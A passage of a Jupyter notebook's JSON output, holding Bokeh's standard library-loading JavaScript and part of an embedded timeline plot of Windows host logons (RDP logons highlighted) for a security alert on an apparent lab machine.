       "    if (id != null && id in Bokeh.index) {\n",
       "      Bokeh.index[id].model.document.clear();\n",
       "      delete Bokeh.index[id];\n",
       "    }\n",
       "\n",
       "    if (server_id !== undefined) {\n",
       "      // Clean up Bokeh references\n",
       "      var cmd = \"from bokeh.io.state import curstate; print(curstate().uuid_to_server['\" + server_id + \"'].get_sessions()[0].document.roots[0]._id)\";\n",
       "      cell.notebook.kernel.execute(cmd, {\n",
       "        iopub: {\n",
       "          output: function(msg) {\n",
       "            var id = msg.content.text.trim();\n",
       "            if (id in Bokeh.index) {\n",
       "              Bokeh.index[id].model.document.clear();\n",
       "              delete Bokeh.index[id];\n",
       "            }\n",
       "          }\n",
       "        }\n",
       "      });\n",
       "      // Destroy server and session\n",
       "      var cmd = \"import bokeh.io.notebook as ion; ion.destroy_server('\" + server_id + \"')\";\n",
       "      cell.notebook.kernel.execute(cmd);\n",
       "    }\n",
       "  }\n",
       "\n",
       "  /**\n",
       "   * Handle when a new output is added\n",
       "   */\n",
       "  function handleAddOutput(event, handle) {\n",
       "    var output_area = handle.output_area;\n",
       "    var output = handle.output;\n",
       "\n",
       "    // limit handleAddOutput to display_data with EXEC_MIME_TYPE content only\n",
       "    if ((output.output_type != \"display_data\") || (!output.data.hasOwnProperty(EXEC_MIME_TYPE))) {\n",
       "      return\n",
       "    }\n",
       "\n",
       "    var toinsert = output_area.element.find(\".\" + CLASS_NAME.split(' ')[0]);\n",
       "\n",
       "    if (output.metadata[EXEC_MIME_TYPE][\"id\"] !== undefined) {\n",
       "      toinsert[toinsert.length - 1].firstChild.textContent = output.data[JS_MIME_TYPE];\n",
       "      // store reference to embed id on output_area\n",
       "      output_area._bokeh_element_id = output.metadata[EXEC_MIME_TYPE][\"id\"];\n",
       "    }\n",
       "    if (output.metadata[EXEC_MIME_TYPE][\"server_id\"] !== undefined) {\n",
       "      var bk_div = document.createElement(\"div\");\n",
       "      bk_div.innerHTML = output.data[HTML_MIME_TYPE];\n",
       "      var script_attrs = bk_div.children[0].attributes;\n",
       "      for (var i = 0; i < script_attrs.length; i++) {\n",
       "        toinsert[toinsert.length - 1].firstChild.setAttribute(script_attrs[i].name, script_attrs[i].value);\n",
       "      }\n",
       "      // store reference to server id on output_area\n",
       "      output_area._bokeh_server_id = output.metadata[EXEC_MIME_TYPE][\"server_id\"];\n",
       "    }\n",
       "  }\n",
       "\n",
       "  function register_renderer(events, OutputArea) {\n",
       "\n",
       "    function append_mime(data, metadata, element) {\n",
       "      // create a DOM node to render to\n",
       "      var toinsert = this.create_output_subarea(\n",
       "        metadata,\n",
       "        CLASS_NAME,\n",
       "        EXEC_MIME_TYPE\n",
       "      );\n",
       "      this.keyboard_manager.register_events(toinsert);\n",
       "      // Render to node\n",
       "      var props = {data: data, metadata: metadata[EXEC_MIME_TYPE]};\n",
       "      render(props, toinsert[toinsert.length - 1]);\n",
       "      element.append(toinsert);\n",
       "      return toinsert\n",
       "    }\n",
       "\n",
       "    /* Handle when an output is cleared or removed */\n",
       "    events.on('clear_output.CodeCell', handleClearOutput);\n",
       "    events.on('delete.Cell', handleClearOutput);\n",
       "\n",
       "    /* Handle when a new output is added */\n",
       "    events.on('output_added.OutputArea', handleAddOutput);\n",
       "\n",
       "    /**\n",
       "     * Register the mime type and append_mime function with output_area\n",
       "     */\n",
       "    OutputArea.prototype.register_mime_type(EXEC_MIME_TYPE, append_mime, {\n",
       "      /* Is output safe? */\n",
       "      safe: true,\n",
       "      /* Index of renderer in `output_area.display_order` */\n",
       "      index: 0\n",
       "    });\n",
       "  }\n",
       "\n",
       "  // register the mime type if in Jupyter Notebook environment and previously unregistered\n",
       "  if (root.Jupyter !== undefined) {\n",
       "    var events = require('base/js/events');\n",
       "    var OutputArea = require('notebook/js/outputarea').OutputArea;\n",
       "\n",
       "    if (OutputArea.prototype.mime_types().indexOf(EXEC_MIME_TYPE) == -1) {\n",
       "      register_renderer(events, OutputArea);\n",
       "    }\n",
       "  }\n",
       "\n",
       "  \n",
       "  if (typeof (root._bokeh_timeout) === \"undefined\" || force === true) {\n",
       "    root._bokeh_timeout = Date.now() + 5000;\n",
       "    root._bokeh_failed_load = false;\n",
       "  }\n",
       "\n",
       "  var NB_LOAD_WARNING = {'data': {'text/html':\n",
       "     \"<div style='background-color: #fdd'>\\n\"+\n",
       "     \"<p>\\n\"+\n",
       "     \"BokehJS does not appear to have successfully loaded. If loading BokehJS from CDN, this \\n\"+\n",
       "     \"may be due to a slow or bad network connection. Possible fixes:\\n\"+\n",
       "     \"</p>\\n\"+\n",
       "     \"<ul>\\n\"+\n",
       "     \"<li>re-rerun `output_notebook()` to attempt to load from CDN again, or</li>\\n\"+\n",
       "     \"<li>use INLINE resources instead, as so:</li>\\n\"+\n",
       "     \"</ul>\\n\"+\n",
       "     \"<code>\\n\"+\n",
       "     \"from bokeh.resources import INLINE\\n\"+\n",
       "     \"output_notebook(resources=INLINE)\\n\"+\n",
       "     \"</code>\\n\"+\n",
       "     \"</div>\"}};\n",
       "\n",
       "  function display_loaded() {\n",
       "    var el = document.getElementById(\"1217\");\n",
       "    if (el != null) {\n",
       "      el.textContent = \"BokehJS is loading...\";\n",
       "    }\n",
       "    if (root.Bokeh !== undefined) {\n",
       "      if (el != null) {\n",
       "        el.textContent = \"BokehJS \" + root.Bokeh.version + \" successfully loaded.\";\n",
       "      }\n",
       "    } else if (Date.now() < root._bokeh_timeout) {\n",
       "      setTimeout(display_loaded, 100)\n",
       "    }\n",
       "  }\n",
       "\n",
       "\n",
       "  function run_callbacks() {\n",
       "    try {\n",
       "      root._bokeh_onload_callbacks.forEach(function(callback) { callback() });\n",
       "    }\n",
       "    finally {\n",
       "      delete root._bokeh_onload_callbacks\n",
       "    }\n",
       "    console.info(\"Bokeh: all callbacks have finished\");\n",
       "  }\n",
       "\n",
       "  function load_libs(js_urls, callback) {\n",
       "    root._bokeh_onload_callbacks.push(callback);\n",
       "    if (root._bokeh_is_loading > 0) {\n",
       "      console.log(\"Bokeh: BokehJS is being loaded, scheduling callback at\", now());\n",
       "      return null;\n",
       "    }\n",
       "    if (js_urls == null || js_urls.length === 0) {\n",
       "      run_callbacks();\n",
       "      return null;\n",
       "    }\n",
       "    console.log(\"Bokeh: BokehJS not loaded, scheduling load and callback at\", now());\n",
       "    root._bokeh_is_loading = js_urls.length;\n",
       "    for (var i = 0; i < js_urls.length; i++) {\n",
       "      var url = js_urls[i];\n",
       "      var s = document.createElement('script');\n",
       "      s.src = url;\n",
       "      s.async = false;\n",
       "      s.onreadystatechange = s.onload = function() {\n",
       "        root._bokeh_is_loading--;\n",
       "        if (root._bokeh_is_loading === 0) {\n",
       "          console.log(\"Bokeh: all BokehJS libraries loaded\");\n",
       "          run_callbacks()\n",
       "        }\n",
       "      };\n",
       "      s.onerror = function() {\n",
       "        console.warn(\"failed to load library \" + url);\n",
       "      };\n",
       "      console.log(\"Bokeh: injecting script tag for BokehJS library: \", url);\n",
       "      document.getElementsByTagName(\"head\")[0].appendChild(s);\n",
       "    }\n",
       "  };var element = document.getElementById(\"1217\");\n",
       "  if (element == null) {\n",
       "    console.log(\"Bokeh: ERROR: autoload.js configured with elementid '1217' but no matching script tag was found. \")\n",
       "    return false;\n",
       "  }\n",
       "\n",
       "  var js_urls = [\"https://cdn.pydata.org/bokeh/release/bokeh-1.0.4.min.js\", \"https://cdn.pydata.org/bokeh/release/bokeh-widgets-1.0.4.min.js\", \"https://cdn.pydata.org/bokeh/release/bokeh-tables-1.0.4.min.js\", \"https://cdn.pydata.org/bokeh/release/bokeh-gl-1.0.4.min.js\"];\n",
       "\n",
       "  var inline_js = [\n",
       "    function(Bokeh) {\n",
       "      Bokeh.set_log_level(\"info\");\n",
       "    },\n",
       "    \n",
       "    function(Bokeh) {\n",
       "      \n",
       "    },\n",
       "    function(Bokeh) {\n",
       "      console.log(\"Bokeh: injecting CSS: https://cdn.pydata.org/bokeh/release/bokeh-1.0.4.min.css\");\n",
       "      Bokeh.embed.inject_css(\"https://cdn.pydata.org/bokeh/release/bokeh-1.0.4.min.css\");\n",
       "      console.log(\"Bokeh: injecting CSS: https://cdn.pydata.org/bokeh/release/bokeh-widgets-1.0.4.min.css\");\n",
       "      Bokeh.embed.inject_css(\"https://cdn.pydata.org/bokeh/release/bokeh-widgets-1.0.4.min.css\");\n",
       "      console.log(\"Bokeh: injecting CSS: https://cdn.pydata.org/bokeh/release/bokeh-tables-1.0.4.min.css\");\n",
       "      Bokeh.embed.inject_css(\"https://cdn.pydata.org/bokeh/release/bokeh-tables-1.0.4.min.css\");\n",
       "    }\n",
       "  ];\n",
       "\n",
       "  function run_inline_js() {\n",
       "    \n",
       "    if ((root.Bokeh !== undefined) || (force === true)) {\n",
       "      for (var i = 0; i < inline_js.length; i++) {\n",
       "        inline_js[i].call(root, root.Bokeh);\n",
       "      }if (force === true) {\n",
       "        display_loaded();\n",
       "      }} else if (Date.now() < root._bokeh_timeout) {\n",
       "      setTimeout(run_inline_js, 100);\n",
       "    } else if (!root._bokeh_failed_load) {\n",
       "      console.log(\"Bokeh: BokehJS failed to load within specified timeout.\");\n",
       "      root._bokeh_failed_load = true;\n",
       "    } else if (force !== true) {\n",
       "      var cell = $(document.getElementById(\"1217\")).parents('.cell').data().cell;\n",
       "      cell.output_area.append_execute_result(NB_LOAD_WARNING)\n",
       "    }\n",
       "\n",
       "  }\n",
       "\n",
       "  if (root._bokeh_is_loading === 0) {\n",
       "    console.log(\"Bokeh: BokehJS loaded, going straight to plotting\");\n",
       "    run_inline_js();\n",
       "  } else {\n",
       "    load_libs(js_urls, function() {\n",
       "      console.log(\"Bokeh: BokehJS plotting callback run at\", now());\n",
       "      run_inline_js();\n",
       "    });\n",
       "  }\n",
       "}(window));"
      ],
      "application/vnd.bokehjs_load.v0+json": "\n(function(root) {\n  function now() {\n    return new Date();\n  }\n\n  var force = true;\n\n  if (typeof (root._bokeh_onload_callbacks) === \"undefined\" || force === true) {\n    root._bokeh_onload_callbacks = [];\n    root._bokeh_is_loading = undefined;\n  }\n\n  \n\n  \n  if (typeof (root._bokeh_timeout) === \"undefined\" || force === true) {\n    root._bokeh_timeout = Date.now() + 5000;\n    root._bokeh_failed_load = false;\n  }\n\n  var NB_LOAD_WARNING = {'data': {'text/html':\n     \"<div style='background-color: #fdd'>\\n\"+\n     \"<p>\\n\"+\n     \"BokehJS does not appear to have successfully loaded. If loading BokehJS from CDN, this \\n\"+\n     \"may be due to a slow or bad network connection. Possible fixes:\\n\"+\n     \"</p>\\n\"+\n     \"<ul>\\n\"+\n     \"<li>re-rerun `output_notebook()` to attempt to load from CDN again, or</li>\\n\"+\n     \"<li>use INLINE resources instead, as so:</li>\\n\"+\n     \"</ul>\\n\"+\n     \"<code>\\n\"+\n     \"from bokeh.resources import INLINE\\n\"+\n     \"output_notebook(resources=INLINE)\\n\"+\n     \"</code>\\n\"+\n     \"</div>\"}};\n\n  function display_loaded() {\n    var el = document.getElementById(\"1217\");\n    if (el != null) {\n      el.textContent = \"BokehJS is loading...\";\n    }\n    if (root.Bokeh !== undefined) {\n      if (el != null) {\n        el.textContent = \"BokehJS \" + root.Bokeh.version + \" successfully loaded.\";\n      }\n    } else if (Date.now() < root._bokeh_timeout) {\n      setTimeout(display_loaded, 100)\n    }\n  }\n\n\n  function run_callbacks() {\n    try {\n      root._bokeh_onload_callbacks.forEach(function(callback) { callback() });\n    }\n    finally {\n      delete root._bokeh_onload_callbacks\n    }\n    console.info(\"Bokeh: all callbacks have finished\");\n  }\n\n  function load_libs(js_urls, callback) {\n    root._bokeh_onload_callbacks.push(callback);\n    if (root._bokeh_is_loading > 0) {\n      console.log(\"Bokeh: BokehJS is being loaded, scheduling callback at\", now());\n      return null;\n    }\n    if (js_urls == null || js_urls.length === 0) {\n      run_callbacks();\n      return null;\n    }\n    console.log(\"Bokeh: BokehJS not loaded, scheduling load and callback at\", now());\n    root._bokeh_is_loading = js_urls.length;\n    for (var i = 0; i < js_urls.length; i++) {\n      var url = js_urls[i];\n      var s = document.createElement('script');\n      s.src = url;\n      s.async = false;\n      s.onreadystatechange = s.onload = function() {\n        root._bokeh_is_loading--;\n        if (root._bokeh_is_loading === 0) {\n          console.log(\"Bokeh: all BokehJS libraries loaded\");\n          run_callbacks()\n        }\n      };\n      s.onerror = function() {\n        console.warn(\"failed to load library \" + url);\n      };\n      console.log(\"Bokeh: injecting script tag for BokehJS library: \", url);\n      document.getElementsByTagName(\"head\")[0].appendChild(s);\n    }\n  };var element = document.getElementById(\"1217\");\n  if (element == null) {\n    console.log(\"Bokeh: ERROR: autoload.js configured with elementid '1217' but no matching script tag was found. \")\n    return false;\n  }\n\n  var js_urls = [\"https://cdn.pydata.org/bokeh/release/bokeh-1.0.4.min.js\", \"https://cdn.pydata.org/bokeh/release/bokeh-widgets-1.0.4.min.js\", \"https://cdn.pydata.org/bokeh/release/bokeh-tables-1.0.4.min.js\", \"https://cdn.pydata.org/bokeh/release/bokeh-gl-1.0.4.min.js\"];\n\n  var inline_js = [\n    function(Bokeh) {\n      Bokeh.set_log_level(\"info\");\n    },\n    \n    function(Bokeh) {\n      \n    },\n    function(Bokeh) {\n      console.log(\"Bokeh: injecting CSS: https://cdn.pydata.org/bokeh/release/bokeh-1.0.4.min.css\");\n      Bokeh.embed.inject_css(\"https://cdn.pydata.org/bokeh/release/bokeh-1.0.4.min.css\");\n      console.log(\"Bokeh: injecting CSS: https://cdn.pydata.org/bokeh/release/bokeh-widgets-1.0.4.min.css\");\n      Bokeh.embed.inject_css(\"https://cdn.pydata.org/bokeh/release/bokeh-widgets-1.0.4.min.css\");\n      console.log(\"Bokeh: injecting CSS: https://cdn.pydata.org/bokeh/release/bokeh-tables-1.0.4.min.css\");\n      Bokeh.embed.inject_css(\"https://cdn.pydata.org/bokeh/release/bokeh-tables-1.0.4.min.css\");\n    }\n  ];\n\n  function run_inline_js() {\n    \n    if ((root.Bokeh !== undefined) || (force === true)) {\n      for (var i = 0; i < inline_js.length; i++) {\n        inline_js[i].call(root, root.Bokeh);\n      }if (force === true) {\n        display_loaded();\n      }} else if (Date.now() < root._bokeh_timeout) {\n      setTimeout(run_inline_js, 100);\n    } else if (!root._bokeh_failed_load) {\n      console.log(\"Bokeh: BokehJS failed to load within specified timeout.\");\n      root._bokeh_failed_load = true;\n    } else if (force !== true) {\n      var cell = $(document.getElementById(\"1217\")).parents('.cell').data().cell;\n      cell.output_area.append_execute_result(NB_LOAD_WARNING)\n    }\n\n  }\n\n  if (root._bokeh_is_loading === 0) {\n    console.log(\"Bokeh: BokehJS loaded, going straight to plotting\");\n    run_inline_js();\n  } else {\n    load_libs(js_urls, function() {\n      console.log(\"Bokeh: BokehJS plotting callback run at\", now());\n      run_inline_js();\n    });\n  }\n}(window));"
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Alert start time =  2019-02-16 03:23:54\n"
     ]
    },
    {
     "data": {
      "text/html": [
       "\n",
       "\n",
       "\n",
       "\n",
       "\n",
       "\n",
       "  <div class=\"bk-root\" id=\"354a44de-29e5-4344-83fc-23e9a15e046f\" data-root-id=\"1221\"></div>\n"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/javascript": [
       "(function(root) {\n",
       "  function embed_document(root) {\n",
       "    \n",
       "  var docs_json = {\"50ad8eec-5a8c-4304-b505-9ab0c91cd57c\":{\"roots\":{\"references\":[{\"attributes\":{\"below\":[{\"id\":\"1231\",\"type\":\"DatetimeAxis\"}],\"left\":[{\"id\":\"1236\",\"type\":\"LinearAxis\"}],\"min_border_left\":50,\"plot_height\":300,\"plot_width\":900,\"renderers\":[{\"id\":\"1231\",\"type\":\"DatetimeAxis\"},{\"id\":\"1235\",\"type\":\"Grid\"},{\"id\":\"1236\",\"type\":\"LinearAxis\"},{\"id\":\"1240\",\"type\":\"Grid\"},{\"id\":\"1248\",\"type\":\"BoxAnnotation\"},{\"id\":\"1258\",\"type\":\"GlyphRenderer\"},{\"id\":\"1264\",\"type\":\"GlyphRenderer\"},{\"id\":\"1269\",\"type\":\"GlyphRenderer\"},{\"id\":\"1271\",\"type\":\"Label\"}],\"title\":{\"id\":\"1220\",\"type\":\"Title\"},\"toolbar\":{\"id\":\"1245\",\"type\":\"Toolbar\"},\"x_range\":{\"id\":\"1223\",\"type\":\"DataRange1d\"},\"x_scale\":{\"id\":\"1227\",\"type\":\"LinearScale\"},\"y_range\":{\"id\":\"1225\",\"type\":\"DataRange1d\"},\"y_scale\":{\"id\":\"1229\",\"type\":\"LinearScale\"}},\"id\":\"1221\",\"subtype\":\"Figure\",\"type\":\"Plot\"},{\"attributes\":{\"days\":[\"%m-%d %H:%M\"],\"hours\":[\"%H:%M:%S\"],\"milliseconds\":[\"%H:%M:%S.%3N\"],\"minutes\":[\"%H:%M:%S\"],\"seconds\":[\"%H:%M:%S\"]},\"id\":\"1253\",\"type\":\"DatetimeTickFormatter\"},{\"attributes\":{\"line_color\":\"#1f77b4\",\"x\":{\"field\":\"x\"},\"y\":{\"field\":\"y\"}},\"id\":\"1267\",\"type\":\"Line\"},{\"attributes\":{},\"id\":\"1241\",\"type\":\"PanTool\"},{\"attributes\":{\"dimensions\":\"width\"},\"id\":\"1242\",\"type\":\"WheelZoomTool\"},{\"attributes\":{\"fill_alpha\":{\"value\":0.5},\"fill_color\":{\"value\":\"navy\"},\"line_alpha\":{\"value\":0.5},\"line_color\":{\"value\":\"navy\"},\"size\":{\"units\":\"screen\",\"value\":10},\"x\":{\"field\":\"TimeGenerated\"},\"y\":{\"field\":\"y_index\"}},\"id\":\"1256\",\"type\":\"Circle\"},{\"attributes\":{},\"id\":\"1292\",\"type\":\"UnionRenderers\"},{\"attributes\":{\"line_alpha\":0.1,\"line_color\":\"#1f77b4\",\"x\":{\"field\":\"x\"},\"y\":{\"field\":\"y\"}},\"id\":\"1268\",\"type\":\"Line\"},{\"attributes\":{\"overlay\":{\"id\":\"1248\",\"type\":\"BoxAnnotation\"}},\"id\":\"1243\",\"type\":\"BoxZoomTool\"},{\"attributes\":{},\"id\":\"1293\",\"type\":\"Selection\"},{\"attributes\":{\"dimension\":1,\"plot\":{\"id\":\"1221\",\"subtype\":\"Figure\",\"type\":\"Plot\"},\"ticker\":{\"id\":\"1237\",\"type\":\"BasicTicker\"}},\"id\":\"1240\",\"type\":\"Grid\"},{\"attributes\":{\"data_source\":{\"id\":\"1266\",\"type\":\"ColumnDataSource\"},\"glyph\":{\"id\":\"1267\",\"type\":\"Line\"},\"hover_glyph\":null,\"muted_glyph\":null,\"nonselection_glyph\":{\"id\":\"1268\",\"type\":\"Line\"},\"selection_glyph\":null,\"view\":{\"id\":\"1270\",\"type\":\"CDSView\"}},\"id\":\"1269\",\"type\":\"GlyphRenderer\"},{\"attributes\":{\"active_drag\":\"auto\",\"active_inspect\":\"auto\",\"active_multi\":null,\"active_scroll\":\"auto\",\"active_tap\":\"auto\",\"tools\":[{\"id\":\"1219\",\"type\":\"HoverTool\"},{\"id\":\"1241\",\"type\":\"PanTool\"},{\"id\":\"1242\",\"type\":\"WheelZoomTool\"},{\"id\":\"1243\",\"type\":\"BoxZoomTool\"},{\"id\":\"1244\",\"type\":\"ResetTool\"}]},\"id\":\"1245\",\"type\":\"Toolbar\"},{\"attributes\":{\"source\":{\"id\":\"1266\",\"type\":\"ColumnDataSource\"}},\"id\":\"1270\",\"type\":\"CDSView\"},{\"attributes\":{\"bottom_units\":\"screen\",\"fill_alpha\":{\"value\":0.5},\"fill_color\":{\"value\":\"lightgrey\"},\"left_units\":\"screen\",\"level\":\"overlay\",\"line_alpha\":{\"value\":1.0},\"line_color\":{\"value\":\"black\"},\"line_dash\":[4,4],\"line_width\":{\"value\":2},\"plot\":null,\"render_mode\":\"css\",\"right_units\":\"screen\",\"top_units\":\"screen\"},\"id\":\"1248\",\"type\":\"BoxAnnotation\"},{\"attributes\":{\"background_fill_color\":{\"value\":\"white\"},\"border_line_color\":{\"value\":\"red\"},\"plot\":{\"id\":\"1221\",\"subtype\":\"Figure\",\"type\":\"Plot\"},\"render_mode\":\"css\",\"text\":\"< Alert time\",\"x\":1550287434000.0,\"y\":0,\"y_offset\":10},\"id\":\"1271\",\"type\":\"Label\"},{\"attributes\":{\"days\":[1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31]},\"id\":\"1279\",\"type\":\"DaysTicker\"},{\"attributes\":{\"fill_alpha\":{\"value\":0.1},\"fill_color\":{\"value\":\"#1f77b4\"},\"line_alpha\":{\"value\":0.1},\"line_color\":{\"value\":\"#1f77b4\"},\"size\":{\"units\":\"screen\",\"value\":10},\"x\":{\"field\":\"TimeGenerated\"},\"y\":{\"field\":\"y_index\"}},\"id\":\"1257\",\"type\":\"Circle\"},{\"attributes\":{\"mantissas\":[1,2,5],\"max_interval\":500.0,\"num_minor_ticks\":0},\"id\":\"1276\",\"type\":\"AdaptiveTicker\"},{\"attributes\":{\"plot\":null,\"text\":\"Timeline All Host Logons (RDP Logons in green)\"},\"id\":\"1220\",\"type\":\"Title\"},{\"attributes\":{\"days\":[1,4,7,10,13,16,19,22,25,28]},\"id\":\"1280\",\"type\":\"DaysTicker\"},{\"attributes\":{\"data_source\":{\"id\":\"1218\",\"type\":\"ColumnDataSource\"},\"glyph\":{\"id\":\"1256\",\"type\":\"Circle\"},\"hover_glyph\":null,\"muted_glyph\":null,\"nonselection_glyph\":{\"id\":\"1257\",\"type\":\"Circle\"},\"selection_glyph\":null,\"view\":{\"id\":\"1259\",\"type\":\"CDSView\"}},\"id\":\"1258\",\"type\":\"GlyphRenderer\"},{\"attributes\":{\"formatter\":{\"id\":\"1275\",\"type\":\"BasicTickFormatter\"},\"plot\":{\"id\":\"1221\",\"subtype\":\"Figure\",\"type\":\"Plot\"},\"ticker\":{\"id\":\"1237\",\"type\":\"BasicTicker\"},\"visible\":false},\"id\":\"1236\",\"type\":\"LinearAxis\"},{\"attributes\":{\"callback\":null},\"id\":\"1223\",\"type\":\"DataRange1d\"},{\"attributes\":{\"days\":[1,8,15,22]},\"id\":\"1281\",\"type\":\"DaysTicker\"},{\"attributes\":{\"source\":{\"id\":\"1218\",\"type\":\"ColumnDataSource\"}},\"id\":\"1259\",\"type\":\"CDSView\"},{\"attributes\":{\"num_minor_ticks\":10,\"tickers\":[{\"id\":\"1276\",\"type\":\"AdaptiveTicker\"},{\"id\":\"1277\",\"type\":\"AdaptiveTicker\"},{\"id\":\"1278\",\"type\":\"AdaptiveTicker\"},{\"id\":\"1279\",\"type\":\"DaysTicker\"},{\"id\":\"1280\",\"type\":\"DaysTicker\"},{\"id\":\"1281\",\"type\":\"DaysTicker\"},{\"id\":\"1282\",\"type\":\"DaysTicker\"},{\"id\":\"1283\",\"type\":\"MonthsTicker\"},{\"id\":\"1284\",\"type\":\"MonthsTicker\"},{\"id\":\"1285\",\"type\":\"MonthsTicker\"},{\"id\":\"1286\",\"type\":\"MonthsTicker\"},{\"id\":\"1287\",\"type\":\"YearsTicker\"}]},\"id\":\"1232\",\"type\":\"DatetimeTicker\"},{\"attributes\":{\"callback\":null},\"id\":\"1225\",\"type\":\"DataRange1d\"},{\"attributes\":{\"callback\":null,\"data\":{\"Account\":[\"MSTICAlertsWin1\\\\MSTICAdmin\",\"MSTICAlertsWin1\\\\ian\",\"MSTICAlertsWin1\\\\ian\",\"MSTICAlertsWin1\\\\ian\",\"MSTICAlertsWin1\\\\ian\",\"MSTICAlertsWin1\\\\MSTICAdmin\"],\"LogonType\":[10,10,10,10,10,10],\"TimeGenerated\":{\"__ndarray__\":\"APCf2DWOdkIAwJ1cRY92QgDAnVxFj3ZCAOC8liuPdkIA4LyWK492QgAQ0M70jnZC\",\"dtype\":\"float64\",\"shape\":[6]},\"index\":[96,107,108,122,123,142],\"y_index\":[1,1,1,1,1,1]},\"selected\":{\"id\":\"1291\",\"type\":\"Selection\"},\"selection_policy\":{\"id\":\"1290\",\"type\":\"UnionRenderers\"}},\"id\":\"1260\",\"type\":\"ColumnDataSource\"},{\"attributes\":{\"days\":[1,15]},\"id\":\"1282\",\"type\":\"DaysTicker\"},{\"attributes\":{},\"id\":\"1275\",\"type\":\"BasicTickFormatter\"},{\"attributes\":{\"months\":[0,1,2,3,4,5,6,7,8,9,10,11]},\"id\":\"1283\",\"type\":\"MonthsTicker\"},{\"attributes\":{\"base\":24,\"mantissas\":[1,2,4,6,8,12],\"max_interval\":43200000.0,\"min_interval\":3600000.0,\"num_minor_ticks\":0},\"id\":\"1278\",\"type\":\"AdaptiveTicker\"},{\"attributes\":{\"months\":[0,2,4,6,8,10]},\"id\":\"1284\",\"type\":\"MonthsTicker\"},{\"attributes\":{\"callback\":null,\"data\":{\"Account\":[\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"MSTICAlertsWin1\\\\MSTICAdmin\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"MSTICAlertsWin1\\\\MSTICAdmin\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\NETWORK SERVICE\",\"Window Manager\\\\DWM-1\",\"Window Manager\\\\DWM-1\",\"NT AUTHORITY\\\\LOCAL SERVICE\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"MSTICAlertsWin1\\\\MSTICAdmin\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\IUSR\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"Window Manager\\\\DWM-2\",\"Window Manager\\\\DWM-2\",\"NT AUTHORITY\\\\SYSTEM\",\"MSTICAlertsWin1\\\\ian\",\"MSTICAlertsWin1\\\\ian\",\"MSTICAlertsWin1\\\\ian\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"MSTICAlertsWin1\\\\ian\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"MSTICAlertsWin1\\\\ian\",\"MSTICAlertsWin1\\\\ian\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"MSTICAlertsWin1\\\\MSTICAdmin\",\"MSTICAlertsWin1\\\\MSTICAdmin\",\"Window Manager\\\\DWM-2\",\"Window Manager\\\\DWM-2\",\"MSTICAlertsWin1\\\\MSTICAdmin\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"NT AUTHORITY\\\\SYSTEM\",\"MSTICAlertsWin1\\\\ian\",\"MSTICAlertsWin1\\\\ian\",\"Window Manager\\\\DWM-4\",\"Window Manager\\\\DWM-4\",\"MSTICAlertsWin1\\\\ian\",\"MSTICAlertsWin1\\\\ian\",\"NT 